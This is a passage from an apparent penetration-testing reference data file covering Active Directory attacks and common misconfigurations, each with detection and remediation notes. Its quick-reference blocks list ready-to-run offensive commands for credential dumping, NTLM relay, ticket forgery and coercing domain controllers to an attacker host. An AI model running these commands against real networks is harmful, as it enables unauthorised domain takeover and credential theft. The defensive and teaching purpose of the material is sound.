              ["Best targets", "SPN accounts that are members of privileged groups with weak/old passwords"],
              ["Etype matters", "RC4 (13100) cracks far faster than AES; tools request RC4 when possible"],
              ["Detection", "A burst of TGS (event 4769) requests, especially RC4, from one account"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Credential compromise", "Recover the service account's cleartext password offline"],
              ["Privilege escalation", "Many service accounts are over-privileged, some Domain Admins"],
              ["Lateral movement", "Reuse the account across systems it can access"],
              ["Stealth", "The ticket request is indistinguishable from normal Kerberos traffic"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use Group Managed Service Accounts (gMSA) — the DC manages a 120+ character password automatically, making roasting infeasible.",
              "Where gMSA is not possible, enforce long (25+ char) random passwords on service accounts.",
              "Enforce AES-only Kerberos to remove the fast RC4 cracking path.",
              "Apply least privilege to service accounts so a crack has limited blast radius.",
              "Monitor event 4769 for RC4 ticket-request spikes and deploy honeypot SPN accounts."
            ]
          }
        ]
      },
      {
        id: "asrep-roasting-vuln",
        name: "AS-REP Roasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/004/",
        theory: "theory/2026-08-18-asrep-roasting.html",
        description: "Accounts with Kerberos pre-authentication disabled yield crackable AS-REP material — sometimes with no credentials.",
        brief: "When an account has 'do not require pre-authentication' set, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline. With a valid credential you enumerate these accounts via LDAP; with only a username list you can attempt the request unauthenticated.\n\nPre-auth is usually disabled for a legacy app and never re-enabled. See the AS-REP Roasting theory page for the full mechanism.",
        quickReference: [
          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/user:pass -request -outputfile asrep.txt" },
          { label: "No creds — username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass" },
          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" },
          { label: "Find targets (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" }
        ],
        sections: [
          {
            title: "Preconditions & Signal",
            type: "table",
            columns: ["Item", "Detail"],
            rows: [
              ["Requires", "A username list (unauthenticated) or any domain credential (to enumerate)"],
              ["Target", "Accounts with DONT_REQ_PREAUTH set"],
              ["Pairs with", "Kerbrute username enumeration to build the candidate list quietly"],
              ["Etype", "RC4 AS-REP (18200) cracks quickly"],
              ["Detection", "Event 4768 with pre-auth type 0 for such accounts"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Credential compromise", "Crack the account password offline"],
              ["Initial foothold", "Can yield a first valid credential from just a name list"],
              ["Privilege escalation", "If the roasted account is privileged"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit for and clear the DONT_REQ_PREAUTH flag everywhere it appears; never disable pre-authentication.",
              "If an exception is truly required, give the account a long random password so the AS-REP is uncrackable.",
              "Monitor event 4768 with pre-auth type 0 and deploy a honeypot account with pre-auth disabled.",
              "Enforce AES to slow cracking where the flag cannot be removed immediately."
            ]
          }
        ]
      },
      {
        id: "unconstrained-delegation",
        name: "Unconstrained Delegation",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/",
        theory: "theory/2026-08-18-delegation.html",
        description: "A host trusted for unconstrained delegation caches the TGTs of anyone who authenticates to it — coerce a DC and capture its ticket.",
        brief: "A computer trusted for unconstrained delegation stores the full TGT of every user that authenticates to it, so it can impersonate them anywhere. If you compromise such a host — or coerce a high-value account like a domain controller to authenticate to it — you capture that TGT and become that identity.\n\nCoercing a DC's machine account and capturing its TGT is effectively domain compromise. See the Delegation theory page for the mechanism.",
        quickReference: [
          { label: "Find unconstrained hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
          { label: "Capture TGTs on the host", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
          { label: "Coerce a DC to authenticate", cmd: "printerbug.py corp.local/user:pass@dc01 attacker_host" },
          { label: "Reuse the captured DC TGT", cmd: "export KRB5CCNAME=DC01$.ccache && secretsdump.py -k -no-pass dc01" }
        ],
        sections: [
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Find it", "A computer with TRUSTED_FOR_DELEGATION (BloodHound flags these)"],
              ["Control the host", "Compromise it, or own a computer object you created"],
              ["Listen", "Run a capture listener with the host's key material"],
              ["Coerce", "Force a DC to authenticate to the host (PrinterBug/PetitPotam/Coercer)"],
              ["Capture & impersonate", "The DC's TGT is cached; use it to DCSync the domain"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Domain compromise", "Capturing a DC's TGT yields the domain's secrets"],
              ["Identity theft", "Impersonate any user who authenticates to the host"],
              ["Persistence", "Combine with DCSync/Golden Ticket for durable control"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Eliminate unconstrained delegation except where strictly required, and never on non-DC servers.",
              "Put sensitive/Tier-0 accounts in Protected Users or mark them 'account is sensitive and cannot be delegated'.",
              "Disable the Print Spooler on DCs and patch coercion vectors to remove the trigger.",
              "Prefer resource-based constrained delegation (RBCD) with tight scoping over unconstrained/constrained delegation.",
              "Monitor for coercion RPC calls and anomalous TGT usage."
            ]
          }
        ]
      },
      {
        id: "rbcd",
        name: "Resource-Based Constrained Delegation (RBCD)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1134/",
        theory: "theory/2026-08-18-delegation.html",
        description: "Write access to a computer object lets an attacker configure delegation and impersonate any user to that host.",
        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. If you can write that attribute — through an ACL you hold or a relayed LDAP session — you point it at an account you control and then impersonate any user (including a domain admin) to that computer.\n\nBecause a normal user can create computer accounts by default (MachineAccountQuota), the whole chain is often achievable from a foothold. See the Delegation theory page for the mechanism.",
        quickReference: [
          { label: "Create a computer you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass Pass123 corp.local/user:pass" },
          { label: "Write RBCD on the target", cmd: "bloodyAD -u user -p pass -d corp.local add rbcd TARGET$ EVIL$" },
          { label: "Impersonate to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:Pass123" },
          { label: "Via relay", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
        ],
        sections: [
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Control an SPN account", "Create a computer account (MachineAccountQuota) or use one you own"],
              ["Gain write on the target", "GenericWrite/GenericAll over a computer (ACL) or a relayed LDAP session"],
              ["Set the RBCD attribute", "Point msDS-AllowedToActOnBehalfOfOtherIdentity at your account"],
              ["Impersonate", "S4U2Self + S4U2Proxy to get a service ticket as Administrator to the target"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Host takeover", "Full access to the target computer as any user"],
              ["Privilege escalation", "Impersonate a domain admin to the target"],
              ["Common relay payoff", "The standard follow-up to an LDAP relay or an ACL win"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set MachineAccountQuota to 0 so ordinary users cannot create the computer account the chain needs.",
              "Audit and tighten ACLs on computer objects; GenericWrite/GenericAll for non-admins is the enabling condition.",
              "Enforce LDAP signing and channel binding to close the relay route into RBCD setup.",
              "Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity.",
              "Place Tier-0 accounts in Protected Users to limit impersonation."
            ]
          }
        ]
      },
      {
        id: "adcs-esc",
        name: "AD CS Template Abuse (ESC1–ESC8)",
        severity: "Critical",
        ref: "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        theory: "theory/2026-08-18-adcs.html",
        description: "Misconfigured certificate templates or CA endpoints let an attacker obtain a certificate as anyone — then authenticate as them.",
        brief: "Active Directory Certificate Services mints authentication. A certificate with a client-auth EKU can be exchanged for a Kerberos TGT via PKINIT, so any misconfiguration that lets you obtain a certificate for an identity you should not control is a path to becoming that identity — often a domain admin or a DC.\n\nThe ESC1–ESC8 classes catalogue these: enrollee-supplied subjects, dangerous template/CA rights, and NTLM relay to the CA web endpoint. Certipy finds and exploits them. See the AD CS theory page for detail.",
        quickReference: [
          { label: "Find vulnerable templates", cmd: "certipy find -u user@corp.local -p pass -dc-ip <dc> -vulnerable" },
          { label: "ESC1 — request as admin", cmd: "certipy req -u user@corp.local -p pass -ca CORP-CA -template Vuln -upn administrator@corp.local" },
          { label: "Authenticate with the cert", cmd: "certipy auth -pfx administrator.pfx -dc-ip <dc>" },
          { label: "ESC8 — relay to CA web", cmd: "ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController" }
        ],
        sections: [
          {
            title: "Key ESC Classes",
            type: "table",
            columns: ["ESC", "Misconfiguration"],
            rows: [
              ["ESC1", "Template lets the enrollee supply the subject (SAN) + client-auth EKU + low-priv enrolment"],
              ["ESC2/3", "Any-Purpose / Enrollment Agent templates usable to authenticate as others"],
              ["ESC4", "Write access to a template object — reconfigure it into ESC1"],
              ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 lets any request set a SAN"],
              ["ESC7", "Dangerous rights over the CA itself (ManageCA/ManageCertificates)"],
              ["ESC8", "CA web enrolment accepts NTLM without EPA — relay a coerced DC for a cert"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Domain compromise", "Obtain a certificate as a DC/admin, then a TGT"],
              ["Durable persistence", "Certificates are long-lived and survive password resets"],
              ["Auth bypass", "PKINIT authentication without knowing any password"],
              ["UnPAC-the-hash", "Recover the target's NT hash from the PKINIT exchange"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit templates and the CA with Certipy/PSPKIAudit; remove ENROLLEE_SUPPLIES_SUBJECT where not required.",
              "Enforce Extended Protection for Authentication (EPA) and disable NTLM on the CA web enrolment endpoint (fixes ESC8).",
              "Restrict enrolment rights and CA management rights to the minimum (addresses ESC4/ESC7).",
              "Require manager approval on sensitive templates and enable certificate issuance logging.",
              "Clear the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA (fixes ESC6)."
            ]
          }
        ]
      },
      {
        id: "dcsync-vuln",
        name: "DCSync",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/006/",
        theory: "theory/2026-08-18-dcsync.html",
        description: "An attacker with replication rights asks a DC to replicate secrets, extracting any hash — including krbtgt.",
        brief: "DCSync abuses the legitimate directory-replication protocol (MS-DRSR) that domain controllers use to sync with each other. Any principal holding the replication rights — DS-Replication-Get-Changes and Get-Changes-All on the domain object — can request an account's secrets from a DC without running code on it or touching NTDS.dit on disk.\n\nThe prize is the krbtgt key, which enables Golden Tickets and durable domain persistence. Replication rights are just ACEs, so a non-admin who is granted them is a straight line to full compromise. See the DCSync theory page.",
        quickReference: [
          { label: "Dump everything (Impacket)", cmd: "secretsdump.py -just-dc corp.local/admin:pass@dc01" },
          { label: "Just krbtgt", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:pass@dc01" },
          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p pass --ntds" },
          { label: "Mimikatz", cmd: "lsadump::dcsync /domain:corp.local /user:krbtgt" }
        ],
        sections: [
          {
            title: "Preconditions",
            type: "table",
            columns: ["Item", "Detail"],
            rows: [
              ["Requires", "DS-Replication-Get-Changes + Get-Changes-All on the domain object"],
              ["Held by default", "Domain Admins, Enterprise Admins, and DCs"],
              ["The risk", "A non-admin granted these rights (an ACL finding) can DCSync"],
              ["Stealth", "No interactive logon or code execution on the DC; looks like replication"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Target", "Consequence"],
            rows: [
              ["krbtgt hash", "Forge Golden Tickets — durable, domain-wide persistence"],
              ["All user hashes", "Complete credential set for cracking and pass-the-hash"],
              ["Trust keys", "Move across domain/forest trusts"],
              ["Domain compromise", "Effectively total control"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit replication rights on the domain object; only DCs and top-tier admins should hold Get-Changes-All.",
              "Monitor for DRSGetNCChanges (replication) requests originating from non-DC hosts — the primary detection.",
              "Rotate the krbtgt password twice (with a replication interval between) after any suspected DA compromise.",
              "Protect Tier-0 accounts and keep them off lower-tier systems.",
              "Alert on unexpected new domain controller objects (catches DCShadow)."
            ]
          }
        ]
      },
      {
        id: "ad-acl-abuse",
        name: "Dangerous AD ACLs",
        severity: "High",
        ref: "https://bloodhound.readthedocs.io/",
        theory: "theory/2026-08-18-acls-dacls.html",
        description: "Over-permissive object permissions (GenericAll, WriteDACL, ForceChangePassword) chain into paths to Domain Admin.",
        brief: "Access to AD objects is governed by ACLs, and a small set of rights can be turned into control of the object they sit on — GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember. In a large domain these accumulate over years, and a single misconfigured ACE can be the first link in a multi-hop path from a low-priv foothold to Domain Admin.\n\nBloodHound exists to compute exactly these chains. See the ACLs & DACLs theory page for how each right converts to compromise.",
        quickReference: [
          { label: "Find paths (BloodHound)", cmd: "Collect with SharpHound/bloodhound-python, run 'Shortest Path to Domain Admins'" },
          { label: "Reset a password (ForceChangePassword)", cmd: "bloodyAD -u user -p pass -d corp.local set password TARGET 'NewPass123!'" },
          { label: "Add self to a group (GenericAll/AddMember)", cmd: "bloodyAD -u user -p pass -d corp.local add groupMember 'Helpdesk Admins' user" },
          { label: "Grant DCSync (WriteDACL on domain)", cmd: "Add replication rights, then DCSync" }
        ],
        sections: [
          {
            title: "Dangerous Rights",
            type: "table",
            columns: ["Right", "Turns into"],
            rows: [
              ["GenericAll", "Full control — reset password, add SPN, write any attribute"],
              ["GenericWrite", "Targeted Kerberoast (add SPN), Shadow Credentials, logon-script abuse"],
              ["WriteDACL", "Grant yourself GenericAll, then anything"],
              ["WriteOwner", "Take ownership, rewrite the DACL"],
              ["ForceChangePassword", "Reset the target's password without the current one"],
              ["Replication rights (domain)", "DCSync the whole domain"]
            ]
          },
          {
            title: "Why It Chains",
            type: "table",
            columns: ["Concept", "Detail"],
            rows: [
              ["Rarely direct", "You seldom have a right over DA directly"],
              ["Multi-hop", "GenericWrite on a service account -> roast -> its rights -> next hop -> DA"],
              ["Nested groups", "A right granted to a broad group applies to everyone nested inside"],
              ["AdminSDHolder", "Modifying it propagates a malicious ACE to all protected accounts (persistence)"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Run BloodHound yourself and remediate the dangerous edges and shortest paths to Tier-0.",
              "Apply least privilege on delegation — grant the narrowest right over the smallest scope, avoid GenericAll.",
              "Monitor DACL modifications (event 5136) on sensitive objects and watch AdminSDHolder.",
              "Adopt a tiered administration model so a low-tier ACL win cannot reach high-tier accounts.",
              "Review and prune inherited and legacy ACEs regularly."
            ]
          }
        ]
      },
      {
        id: "ntlm-relay-vuln",
        name: "NTLM Relay & Coercion",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Authentication is captured or coerced, then relayed to a service missing its relay protection (SMB, LDAP, AD CS).",
        brief: "NTLM relay takes an authentication a victim was tricked into starting and forwards it, live, to a service that will accept it — acting as the victim there. Coercion makes it reliable: certain RPC methods force a target (ideally a domain controller's machine account) to authenticate on command.\n\nRelaying succeeds only where a protection is missing — SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web enrolment. Coercing a DC and relaying to AD CS (ESC8) is a leading path to domain compromise. See the Coercion & NTLM Relay theory page.",
        quickReference: [
          { label: "Poison to capture/relay", cmd: "responder -I eth0    (turn off SMB/HTTP to relay instead)" },
          { label: "Coerce a host to authenticate", cmd: "coercer coerce -t dc01 -l attacker_ip -u user -p pass -d corp.local" },
          { label: "Relay to LDAP for RBCD", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" },
          { label: "Find unsigned SMB targets", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" }
        ],
        sections: [
          {
            title: "Relay Targets & Conditions",
            type: "table",
            columns: ["Target", "Requires / yields"],
            rows: [
              ["SMB", "SMB signing NOT required -> SAM/LSA dump, execution"],
              ["LDAP/LDAPS", "Channel binding off -> RBCD, Shadow Credentials, DCSync rights"],
              ["AD CS web (ESC8)", "EPA not enforced -> a certificate as the victim -> a TGT"],
              ["Rule", "You cannot relay auth back to the host it came from — relay elsewhere"]
            ]
          },
          {
            title: "Coercion Vectors",
            type: "table",
            columns: ["Method", "Protocol"],
            rows: [
              ["PrinterBug", "MS-RPRN (print spooler)"],
              ["PetitPotam", "MS-EFSRPC (encrypting file system)"],
              ["DFSCoerce", "MS-DFSNM"],
              ["ShadowCoerce", "MS-FSRVP"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing everywhere — the single most important control; it breaks SMB relay.",
              "Enforce LDAP channel binding and signing to close the RBCD/Shadow-Credential relay paths.",
              "Enable EPA on AD CS web enrolment and disable NTLM there to kill ESC8.",
              "Disable the Print Spooler on DCs and disable LLMNR/NBT-NS to remove coercion and poisoning triggers.",
              "Patch coercion methods, though new vectors appear — the layered signing/EPA controls are the durable fix."
            ]
          }
        ]
      },
      {
        id: "kerberos-ticket-attacks",
        name: "Golden & Silver Tickets",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/001/",
        theory: "theory/2026-08-18-ticket-attacks.html",
        description: "With stolen key material, forge Kerberos tickets — a Silver ticket for one service, a Golden ticket for the whole domain.",
        brief: "Once key material is stolen, an attacker stops requesting tickets and starts forging them. A Silver Ticket is a forged service ticket, made with a service account's key, accepted by that one service without contacting the DC. A Golden Ticket is a forged TGT, made with the krbtgt key, that lets the attacker impersonate anyone across the whole domain and survives password resets.\n\nThese are the persistence endgame of AD compromise — which is why krbtgt theft means the domain must be considered fully compromised. See the Ticket Attacks theory page.",
        quickReference: [
          { label: "Golden Ticket", cmd: "ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator" },
          { label: "Silver Ticket", cmd: "ticketer.py -nthash <service_hash> -domain-sid <sid> -domain corp.local -spn cifs/srv01 Administrator" },
          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=ticket.ccache   (then use -k -no-pass)" },
          { label: "Overpass-the-Hash", cmd: "getTGT.py corp.local/user -hashes :<nthash>" }
        ],
        sections: [
          {
            title: "The Family",
            type: "table",
            columns: ["Attack", "Key needed / scope"],
            rows: [
              ["Overpass-the-Hash", "A user's NT hash -> a legitimate TGT for that user"],
              ["Pass-the-Ticket", "A stolen TGT/service ticket -> reuse its access"],
              ["Silver Ticket", "A service account key -> forge a ticket for that one service (very stealthy)"],
              ["Golden Ticket", "The krbtgt key -> forge TGTs for anyone, domain-wide, durable"],
              ["Diamond Ticket", "krbtgt key -> modify a real TGT (stealthier than Golden)"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Total domain control", "A Golden Ticket impersonates any principal, including fabricated admins"],
              ["Durable persistence", "Survives password resets; only rotating krbtgt twice invalidates it"],
              ["Silent service access", "Silver Tickets never contact the DC — minimal telemetry"],
              ["Fast re-entry", "Regain access after remediation if krbtgt was not rotated"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Protect the krbtgt key — it is the domain's root of trust; rotate it twice after any suspected Tier-0 compromise.",
              "Isolate Tier-0 credentials so TGTs cannot be stolen from ordinary workstations.",
              "Keep Kerberos ticket lifetimes short and monitor for tickets with anomalous lifetimes or impossible group claims.",
              "Alert on ticket use with no matching 4768/4769 request on the DC (Golden/Silver indicator).",
              "Deploy Credential Guard to make extracting the key material far harder in the first place."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Misconfigurations",
    vulns: [
      {
        id: "smb-signing-disabled",
        name: "SMB Signing Not Required",
        severity: "High",
        ref: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Hosts that do not require SMB signing can be targeted by NTLM relay, turning a captured authentication into access.",
        brief: "SMB signing cryptographically signs SMB sessions so a man-in-the-middle cannot tamper with or relay them. When it is not required (the default on non-DC Windows for years), a host becomes a valid NTLM relay target: an attacker who coerces or poisons an authentication can forward it to that host and act as the victim — dumping the SAM or executing commands.\n\nIt is one of the most common and impactful internal misconfigurations, because it converts everyday name-resolution noise into lateral movement.",
        quickReference: [
          { label: "Find hosts without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
          { label: "Check a single host", cmd: "netexec smb 10.0.0.5   (look for signing:False)" },
          { label: "Exploit via relay", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i" },
          { label: "nmap", cmd: "nmap --script smb2-security-mode -p445 <host>" }
        ],
        sections: [
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["NetExec", "The SMB banner shows signing:True/False per host; --gen-relay-list collects the vulnerable ones"],
              ["nmap", "smb2-security-mode reports whether signing is required, enabled, or disabled"],
              ["Scope", "DCs require signing by default; member servers and workstations usually do not"],
              ["Pair with", "LLMNR/NBT-NS poisoning or coercion to generate the authentication to relay"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Lateral movement", "Relay a captured/coerced auth to the unsigned host and act as the victim"],
              ["Credential dumping", "Dump SAM/LSA secrets from the relayed-to host"],
              ["Command execution", "Run commands as the relayed identity"],
              ["Chain to domain", "Combine with coercion of a privileged account for a larger foothold"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing via Group Policy on all systems — 'Microsoft network server: Digitally sign communications (always)'.",
              "Also require signing on clients so they refuse unsigned sessions.",
              "Disable LLMNR and NBT-NS to remove the easiest way to obtain the authentication to relay.",
              "Enforce SMB signing and channel binding together as part of a relay-hardening baseline.",
              "Verify with a relay-list scan after rollout — the vulnerable-host list should be empty."
            ]
          }
        ]
      },
      {
        id: "null-session",
        name: "Anonymous / Null Sessions",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1087/",
        description: "Unauthenticated SMB/RPC or LDAP access leaks users, groups, shares, and the password policy.",
        brief: "A null (anonymous) session is unauthenticated access to a Windows host's SMB/RPC interfaces, historically allowing enumeration of users, groups, shares, and the password policy without any credential. Anonymous LDAP binds are the directory equivalent. Modern Windows locks most of this down, but legacy configurations, older hosts, and misconfigured services still expose it.\n\nThe information it leaks — usernames, the lockout policy, share names — is the groundwork for password spraying and further attacks.",
        quickReference: [
          { label: "Null SMB enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>" },
          { label: "NetExec null check", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol" },
          { label: "RID cycling", cmd: "enum4linux-ng -R <host>   (enumerate users via SID walking)" },
          { label: "Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\"" }
        ],
        sections: [
          {
            title: "What It Leaks",
            type: "table",
            columns: ["Data", "Use"],
            rows: [
              ["Usernames", "Build a spray/roast list"],
              ["Password policy", "Lockout threshold and window — the safe spray rate"],
              ["Shares", "Discover readable shares and their contents"],
              ["Groups", "Identify privileged group membership"],
              ["Domain SID", "Enables RID cycling to enumerate accounts when direct listing is blocked"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Try an empty credential", "'' / '' over SMB and RPC; a guest account may also be enabled"],
              ["Anonymous LDAP", "An unauthenticated bind that returns directory data"],
              ["RID cycling fallback", "Works via the domain SID when -U is blocked"],
              ["Modern reality", "Usually closed on current Windows — do not assume a host is hardened from one empty result"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Restrict anonymous access: set RestrictAnonymous / RestrictAnonymousSAM and 'Network access: Do not allow anonymous enumeration of SAM accounts and shares'.",
              "Disable anonymous LDAP binds on domain controllers.",
              "Disable the guest account and audit legacy hosts that still permit null sessions.",
              "Remove unnecessary shares and lock down share/NTFS permissions.",
              "Since usernames still leak by other means, pair this with a strong lockout policy and MFA."
            ]
          }
        ]
      },
      {
        id: "default-credentials",
        name: "Default Credentials",
        severity: "High",
        ref: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        description: "Devices, panels, and services left on vendor-default or well-known credentials grant instant access.",
        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in. Admin panels, routers, printers, databases, management interfaces, and internal tools are the usual offenders.\n\nIt is unglamorous and extremely common, and it frequently provides the highest-privilege access on a network for zero effort.",
        quickReference: [
          { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat" },
          { label: "Product examples", cmd: "Jenkins, Grafana admin/admin; Tomcat manager; iDRAC/iLO; DB defaults" },
          { label: "Spray defaults across a service", cmd: "netexec <proto> <targets> -u users.txt -p defaults.txt --no-bruteforce" },
          { label: "References", cmd: "Vendor manuals, SecLists Passwords/Default-Credentials, DefaultCreds-cheat-sheet" }
        ],
        sections: [
          {
            title: "Where to Look",
            type: "table",
            columns: ["Target", "Common defaults"],
            rows: [
              ["Web admin panels", "admin/admin, admin/password, product-specific pairs"],
              ["App servers", "Tomcat manager (tomcat/tomcat), JBoss, WebLogic consoles"],
              ["Databases", "sa with blank password (MSSQL), root with no password (MySQL/Mongo)"],
              ["Management interfaces", "iDRAC/iLO/IPMI, switches, routers, printers, cameras"],
              ["Dev/monitoring tools", "Jenkins, Grafana, Kibana, RabbitMQ (guest/guest)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Fingerprint the product", "WhatWeb/Nuclei identifies the software so you know the default to try"],
              ["Consult the default list", "Vendor docs and default-credential databases"],
              ["Test carefully", "Try the top pairs; mind lockouts on real accounts"],
              ["Nuclei templates", "default-logins/ templates automate the check across many products"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Change every default credential before a system goes into service; make it a deployment checklist item.",
              "Enforce a strong-password policy and MFA on management and admin interfaces.",
              "Do not expose management interfaces to untrusted networks; segment and firewall them.",
              "Inventory devices and scan periodically with default-credential checks (Nuclei default-logins).",
              "Disable or remove unused default/sample accounts entirely."
            ]
          }
        ]
      },
      {
        id: "directory-listing",
        name: "Directory Listing Enabled",
        severity: "Low",
        ref: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing",
        description: "The web server auto-indexes folders without an index file, exposing files that were never meant to be browsable.",
        brief: "When a web server is configured to auto-generate a listing for directories that lack an index file, it reveals every file in that folder — including backups, source, config, uploads, and old versions that were never linked and were assumed hidden. It is low severity by itself, but it routinely exposes other findings: credentials in a stray config, a database dump, or source code.\n\nThe fix is simply to disable automatic indexing.",
        quickReference: [
          { label: "Spot it", cmd: "Page titled 'Index of /' with a file listing" },
          { label: "Dork for it", cmd: "site:target.com intitle:\"index of\"" },
          { label: "Probe common dirs", cmd: "/uploads/  /backup/  /files/  /.git/  /assets/  /tmp/" },
          { label: "Scan", cmd: "nuclei -tags exposure; or content discovery with ffuf/feroxbuster" }
        ],
        sections: [
          {
            title: "What It Exposes",
            type: "table",
            columns: ["Content", "Risk"],
            rows: [
              ["Backups", ".bak, .zip, .tar.gz of the site or database"],
              ["Source & config", "Code, .env, config files with secrets"],
              ["Uploads", "User files, sometimes other users' documents"],
              ["Old versions", "Deprecated pages/endpoints still reachable"],
              ["Internal notes", "READMEs, TODOs, and paths that inform further attacks"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Browse directories", "Request a folder path with no index file"],
              ["Search engines", "intitle:\"index of\" scoped to the domain"],
              ["Content discovery", "ffuf/feroxbuster reveal directories to check"],
              ["Scanners", "Nikto and Nuclei exposure templates flag indexing"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable automatic directory indexing (Options -Indexes in Apache; autoindex off in nginx; disable directory browsing in IIS).",
              "Do not store backups, source, or config anywhere under the web root.",
              "Add an index file or explicit deny rules to sensitive directories.",
              "Review what is web-accessible and remove stray files; treat any exposed secret as compromised.",
              "Scan periodically for indexing and exposed files as part of monitoring."
            ]
          }
        ]
      },
      {
        id: "exposed-source-backups",
        name: "Exposed .git / Source & Backups",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code",
        description: "A deployed .git folder, backup archive, or editor swap file lets an attacker reconstruct source and extract secrets.",
        brief: "Deploying a site with its version-control metadata or leaving backups under the web root exposes the application's source. A reachable /.git/ directory can be downloaded and the full repository — including history and secrets in old commits — reconstructed. Backup archives (.zip, .bak, .sql), editor swap/temp files, and .DS_Store listings do the same for source and data.\n\nSource disclosure hands an attacker the code to find further bugs and, very often, hardcoded credentials.",
        quickReference: [
          { label: "Detect exposed git", cmd: "curl -s https://target.com/.git/HEAD   (returns 'ref: refs/heads/...')" },
          { label: "Dump the repo", cmd: "git-dumper https://target.com/.git ./out   (then git log -p for secrets)" },
          { label: "Backup/temp files", cmd: "/backup.zip  /db.sql  /index.php.bak  /.env  /config.php~  /.DS_Store" },
          { label: "Other VCS/CI", cmd: "/.svn/  /.hg/  /.gitignore  /.git/config  exposed CI files" }
        ],
        sections: [
          {
            title: "Exposure Types",
            type: "table",
            columns: ["Artifact", "What it yields"],
            rows: [
              [".git directory", "Full source and history — reconstruct with git-dumper, then mine commits for secrets"],
              ["Backup archives", ".zip/.tar.gz/.bak/.sql of the app or database"],
